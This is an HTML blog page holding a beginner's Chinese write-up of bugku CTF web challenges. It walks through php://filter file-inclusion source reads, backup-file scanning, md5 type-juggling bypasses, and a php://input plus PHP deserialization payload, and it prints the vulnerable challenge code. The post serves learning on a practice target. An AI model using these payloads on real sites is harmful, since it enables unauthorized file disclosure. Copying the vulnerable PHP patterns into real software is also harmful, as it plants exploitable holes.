@@ -1,0 +1,284 @@
+
+<!DOCTYPE html>
+<html lang="" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>从零开始学Web —— bugku题目笔记 - BlackMax&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="​    这篇博客算是开始web学习的第一步吧，虽然binary也没学的咋样，但是还是想了解一下Web这个方向。因为之前Web啥也不知道，所以所有的知识点都算是盲区，就多多记下来，也算是一种复习了。,"> 
+    <meta name="author" content="BlackMax"> 
+    <link rel="alternative" href="atom.xml" title="BlackMax&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">BlackMax&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="blackmax1s.me"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">从零开始学Web —— bugku题目笔记</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">从零开始学Web —— bugku题目笔记</h1>
+        <div class="stuff">
+            <span>一月 08, 2019</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>​    这篇博客算是开始web学习的第一步吧，虽然binary也没学的咋样，但是还是想了解一下Web这个方向。因为之前Web啥也不知道，所以所有的知识点都算是盲区，就多多记下来，也算是一种复习了。</p>
+<h1 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8005&#x2F;post&#x2F;</span><br><span class="line">分值：80</span><br></pre></td></tr></table></figure>
+
+<p>​    先看看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    据说这个?file=show.php一看就是种典型的文件包含，想着换个文件名看看能得到个啥，结果只有一堆这样的标签<img src="bugku_web/flag_index_php.png" alt="index.php"></p>
+<p>​    然后就不知道干啥了，看了看大佬们的wp，要用到一种php里的协议php://filter，这里就学习一下这个协议</p>
+<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>​    这是一种元封装器(虽然现在还不理解什么叫元封装器)，用于筛选(好像还能改变)打开读入的数据流，这里摘一个表格，虽然第四个我也还不懂。</p>
+<table>
+<thead>
+<tr>
+<th align="center">名称</th>
+<th align="center">描述</th>
+<th align="center">必要性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">resource=&lt;要过滤的数据流&gt;</td>
+<td align="center">指定要筛选的数据流，即目标</td>
+<td align="center">必须</td>
+</tr>
+<tr>
+<td align="center">read=&lt;读链的筛选列表&gt;</td>
+<td align="center">可以设定一个或多个过滤器名称，以管道符分割</td>
+<td align="center">可选</td>
+</tr>
+<tr>
+<td align="center">write=&lt;写链的筛选列表&gt;</td>
+<td align="center">同上</td>
+<td align="center">可选</td>
+</tr>
+<tr>
+<td align="center">&lt;；两个链的筛选列表&gt;</td>
+<td align="center">任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>​    回到这题上来，我现在想看一下index.php里都写了些什么。按照上面的思路应该是使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=index.php</span></span><br></pre></td></tr></table></figure>
+
+<p>​    发一下看看发生了什么，e….和上面情况一样，用上read参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read/convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="bugku_web/flag_index_base64.png" alt="base64"></p>
+<p>​    把得到的base64解码一下就能得到index.php正常的代码了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;</span><br><span class="line">	$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	include($file); </span><br><span class="line">&#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    代码对”../“还做了过滤，防止路径穿越，但是其他几个是为了防止什么我现在还不知道。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    这里涉及到的知识点就是文件包含漏洞和利用php://filter读取文件内容。一般可以加上read/convert.base64-encode，这样注释里的内容也能看到了。</p>
+<h1 id="听说备份是个好习惯"><a href="#听说备份是个好习惯" class="headerlink" title="听说备份是个好习惯"></a>听说备份是个好习惯</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web16&#x2F;</span><br><span class="line">分值：80</span><br></pre></td></tr></table></figure>
+
+<p>​    访问之后就只有d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e这样一串数据，看起来就像是md5的值，然后还是重复的两段。大概是两个东西的md5吧。</p>
+<h2 id="泄露源码"><a href="#泄露源码" class="headerlink" title="泄露源码"></a>泄露源码</h2><p>​    然后就陷入了僵局，嘎住了，通过查询，可以用一些工具扫描网站有没有一些文件可以访问的。大佬的<a href="https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true" target="_blank" rel="noopener">脚本</a>，然后跑出来可以看到有两个文件。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python SourceLeakHackerForLinux.py http://123.206.87.240:8002/web16/ </span><br><span class="line">[ 200 ]  Checking : http://123.206.87.240:8002/web16/index.php</span><br><span class="line">[ 200 ]  Checking : http://123.206.87.240:8002/web16/index.php.bak</span><br></pre></td></tr></table></figure>
+
+<p>​    当然也可以用御剑这些工具来扫描，这里就贴个连接<a href="https://ctf-wiki.github.io/ctf-tools/web/" target="_blank" rel="noopener">御剑</a></p>
+<p>​    index.php.bak就是备份文件了，题目也给了备份这个hint，应该是这样没跑了，我们可以访问一下，然后下载得到源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="构造变量"><a href="#构造变量" class="headerlink" title="构造变量"></a>构造变量</h2><p>​    可以看到，我们传入的参数会被解析，然后删除参数名的key这部分子串，最后对key1, key2求md5，如果两个变量不同且md5相同，那么就输出flag。那现在就来构造两个不同但md5相同的变量。网上有很多值得学习的方法，收藏两种思路。</p>
+<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>​    md5函数没有办法对数据进行求值，如果传入的变量是数组，都会当成null，因此两个不同数组的md5相同，所以我们可以构造两个数组变量，kkeyey1[]和kkeyey2[]，然后值随便填。用postman插件发送这两个变量，就能得到flag了。</p>
+<p><img src="bugku_web/bak_array.png" alt="array"></p>
+<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="==漏洞"></a>==漏洞</h3><p>​    另一种思路是利用==弱相等的特性，如果两个字符串md5值是0e开头的，那就会认为是科学计数法，表示0*10的若干次方，不管若干是多少，结果都是0。而==会计算这两个科学计数法表示的值，因此也能通过判断。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">下列的字符串的MD5值都是0e开头的：</span><br><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
+
+<p>​    <img src="bugku_web/bak_==.png" alt="=="></p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>​    这道题有两个知识点，一个是扫描出网站有哪些可以访问的文件，然后一个考点就是md5相同，但变量不同的构造。</p>
+<h1 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h1><p>​    先看看题目，进去之后就只显示了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">亲请在2s内计算老司机的车速是多少</span><br><span class="line"></span><br><span class="line">2022350351-737928933-1822042841+1195747951-822301570+1565020976+659908371+1756957946*42425194*722964027*517020431&#x3D;?;</span><br></pre></td></tr></table></figure>
+
+<p>​    而且源码也看不出什么东西。不过有明显的时间限制，而且要快，可能是需要快速反弹post的题。抓包看看<img src="./bugku_web/qiumingshan_bp.png" alt="qiumingshan">有一个Cookie，估计题目就是让你再session过期之前把答案发回去。</p>
+<h2 id="发送结果"><a href="#发送结果" class="headerlink" title="发送结果"></a>发送结果</h2><p>​    为了能够保证第二次发送结果的时候使用相同的cookie（大概是这个意思吧，就相当于还是同一个会话，具体我也不太了解）就要用到request模块中的Session。这个使用起来也很简单，和request的差不多。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/qiumingshan/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">...</span><br><span class="line">args = &#123;<span class="string">'value'</span> : res&#125;</span><br><span class="line">s.post(url, data = args)	<span class="comment">#直接用post就能发送，data里的参数是个字典</span></span><br></pre></td></tr></table></figure>
+
+<p>​    这里参数的名字为啥是value呢，我狂点刷新之后，有时候界面就会变成这样，猜一下就行了<img src="./bugku_web/qiumingshan_value.png" alt="qiumingshan_value"></p>
+<h2 id="计算结果"><a href="#计算结果" class="headerlink" title="计算结果"></a>计算结果</h2><p>​    这题的目的是让你计算出结果，要快速算出来我们还得先把这个表达式提取出来，这里可以使用正则表达式来提取。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content = source.text</span><br><span class="line"><span class="string">'''\d+表示匹配多位数字，[+\-*]表示+ - *号中的一个,整个(\d+[+\-*])+表示这样的模式匹配多次，最后一个单独匹配，因为没有运算符了，只是多位的数字就行（\d+)'''</span></span><br><span class="line">expression = re.search(<span class="string">r'(\d+[+\-*])+(\d+)'</span>, content)</span><br><span class="line">res = eval(expression)	<span class="comment">#用eval可以直接算出结果</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>​    这种对时间限制非常短的题目可能就是要快速发回去结果的，为了保证同一个session，我们要用Session模块，而不能只是普通的request。这种题其实还有，后面一道让我们搞快点的题也是这个套路，这里就简单说一下，那题把线索藏在了回复的headers[‘flag’]属性里，看起来就是一段base64编码，解码之后又可以得到一个base64的编码，再解码就能得到想要的结果了。参数名绿字也有提示，所以dic = {‘margin’ : res}，用同样的套路发送就行了。</p>
+<p><img src="./bugku_web/gkd.png" alt="gkd"></p>
+<p>​    这题就不写了，放个脚本偷懒一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/web6/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">flag = source.headers[<span class="string">'flag'</span>]</span><br><span class="line">res = base64.b64decode(flag)[<span class="number">-8</span>:]</span><br><span class="line">dic = &#123;<span class="string">'margin'</span> : base64.b64decode(res)&#125;</span><br><span class="line"><span class="keyword">print</span> s.post(url, data = dic).text</span><br></pre></td></tr></table></figure>
+
+<h1 id="Welcome-to-the-bugku"><a href="#Welcome-to-the-bugku" class="headerlink" title="Welcome to the bugku"></a>Welcome to the bugku</h1><p>​    题目没啥信息，先看看源码吧</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:8006/test1/</span></span><br><span class="line"></span><br><span class="line">you are not the number of bugku !   </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    这里需要一个文件内容是welcome to the bugkuctf的文件名，但是我怎么知道是哪个文件呢，说不定都没有这个文件，那咋整呢。这里就又用到了PHP伪协议了，这里用到的是php://input这个伪协议。具体我也解释不清，不敢乱说，大佬的博客里是这么写的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;input代表可以访问请求的原始数据，简单来说POST请求的情况下，php:&#x2F;&#x2F;input可以获取到post的数据。</span><br><span class="line">比较特殊的一点，enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。</span><br></pre></td></tr></table></figure>
+
+<p>​    总之，在这题里面，我们要通过这种方法，自己发送“welcome to the bugkuctf”字符串，然后让他获取到我们post发送的内容，从而绕过了检查。</p>
+<p><img src="./bugku_web/input.png" alt=""></p>
+<p>​    看到这里有变化了，但是只有一行有用，再试试另一种伪协议，前面经常提到的php://filter然后base64编码之后查看被注释掉的源码，这里提示有个hint.php，那就看这个吧。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    这里给了Flag类，这个类的__tostring()会自动读取$file变量的文件内容，只要能读到flag.php就行了。</p>
+<p>​    但是接下来还是不知道要干啥，再看看index.php里的内容，同样还是用php://filter伪协议</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    这样就看清了，如果你要读的文件名里有flag字样 ，就退出了。还有个操作是反序列化传递的password字段，如果我们把password自己构建成读取flag.php，那就可以读取到了。我们自己新建一个Class类，把file的值赋成flag.php，然后进行序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Flag;</span><br><span class="line">$s = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $s; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    这样就得到了password应该要传的值了。</p>
+<p>​    另外，这个函数是在hint.php里的，所以include的文件必须是hint.php，但是我还不清楚为什么会主动触发__string函数。把这些应该填的值都加上去试试</p>
+<p>​    成了</p>
+<p><img src="./bugku_web/payload.png" alt=""></p>
+<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>​    这题主要用到了php://input这个协议，这个很神奇，可以结合自己post的文本内容使用，另外就是反序列化的应用吧。还有__tostring()好像是个魔术方法，具体还没看，有时间补上。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/5146554.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/qq/001faIUs4M2zna.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
